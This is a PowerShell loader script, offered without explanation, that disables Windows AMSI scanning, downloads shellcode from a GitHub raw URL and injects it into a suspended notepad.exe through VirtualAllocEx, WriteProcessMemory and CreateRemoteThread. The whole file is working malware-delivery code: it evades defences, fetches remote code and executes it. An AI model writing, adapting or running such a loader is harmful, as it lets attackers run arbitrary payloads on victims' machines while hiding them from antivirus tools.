# loader.ps1 - Donut shellcode fetch + remote injection into notepad.exe

# Attempt basic AMSI bypass (optional - often already ineffective on latest Win11)
try {
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        .GetField('amsiInitFailed','NonPublic,Static')
        .SetValue($null,$true)
} catch {
    Write-Host "[!] AMSI bypass attempt failed (likely already patched or not needed)"
}

# ───────────────────────────────────────────────
# Download shellcode
# ───────────────────────────────────────────────
$url = "https://github.com/MJansen6/bp/raw/refs/heads/main/shellcode.bin"

try {
    $wc = New-Object Net.WebClient
    $shellcode = $wc.DownloadData($url)
    Write-Host "[+] Downloaded $($shellcode.Length) bytes from $url"
} catch {
    Write-Host "[-] Download failed: $($_.Exception.Message)"
    exit 1
}

$size = $shellcode.Length

# ───────────────────────────────────────────────
# P/Invoke definitions (kernel32)
# ───────────────────────────────────────────────
Add-Type -MemberDefinition @"
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint nSize,
        out uint lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtectEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(
        IntPtr hProcess,
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
"@ -Name Win32 -Namespace Native -PassThru

# ───────────────────────────────────────────────
# Structs
# ───────────────────────────────────────────────
Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
"@

# ───────────────────────────────────────────────
# Injection logic
# ───────────────────────────────────────────────
$si = New-Object STARTUPINFO
$pi = New-Object PROCESS_INFORMATION

$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
$createFlags = 0x4  # CREATE_SUSPENDED

$success = [Native.Win32]::CreateProcess(
    "C:\Windows\System32\notepad.exe",
    $null,
    [IntPtr]::Zero,
    [IntPtr]::Zero,
    $false,
    $createFlags,
    [IntPtr]::Zero,
    $null,
    [ref]$si,
    [ref]$pi
)

if (-not $success) {
    $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    throw "CreateProcess failed with error $err"
}

Write-Host "[+] Created suspended notepad.exe (PID: $($pi.dwProcessId))"

# Allocate memory in remote process
$MEM_COMMIT  = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_READWRITE = 0x04

$addr = [Native.Win32]::VirtualAllocEx(
    $pi.hProcess,
    [IntPtr]::Zero,
    [uint32]$size,
    $MEM_COMMIT -bor $MEM_RESERVE,
    $PAGE_READWRITE
)

if ($addr -eq [IntPtr]::Zero) {
    $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    throw "VirtualAllocEx failed with error $err"
}

Write-Host "[+] Allocated remote memory at 0x$($addr.ToString('X'))"

# Copy shellcode into remote process
$written = 0
$success = [Native.Win32]::WriteProcessMemory(
    $pi.hProcess,
    $addr,
    $shellcode,
    [uint32]$size,
    [ref]$written
)

if (-not $success -or $written -ne $size) {
    $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    throw "WriteProcessMemory failed with error $err (written: $written)"
}

# Change protection to RX (PAGE_EXECUTE_READ)
$PAGE_EXECUTE_READ = 0x20
$oldProtect = 0
$success = [Native.Win32]::VirtualProtectEx(
    $pi.hProcess,
    $addr,
    [uint32]$size,
    $PAGE_EXECUTE_READ,
    [ref]$oldProtect
)

if (-not $success) {
    $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    throw "VirtualProtectEx failed with error $err"
}

Write-Host "[+] Memory protection changed to RX"

# Create remote thread pointing to shellcode
$tid = 0
$remoteThread = [Native.Win32]::CreateRemoteThread(
    $pi.hProcess,
    [IntPtr]::Zero,
    0,
    $addr,
    [IntPtr]::Zero,
    0,
    [ref]$tid
)

if ($remoteThread -eq [IntPtr]::Zero) {
    $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    throw "CreateRemoteThread failed with error $err"
}

Write-Host "[+] Remote thread created (TID: $tid)"

# Resume the main thread → shellcode executes
[Native.Win32]::ResumeThread($pi.hThread) | Out-Null

Write-Host "[+] Notepad resumed - shellcode should be executing now (PID: $($pi.dwProcessId))"

# Optional: clean up handles (not strictly needed)
[Native.Win32]::CloseHandle($pi.hProcess) | Out-Null
[Native.Win32]::CloseHandle($pi.hThread) | Out-Null
[Native.Win32]::CloseHandle($remoteThread) | Out-Null
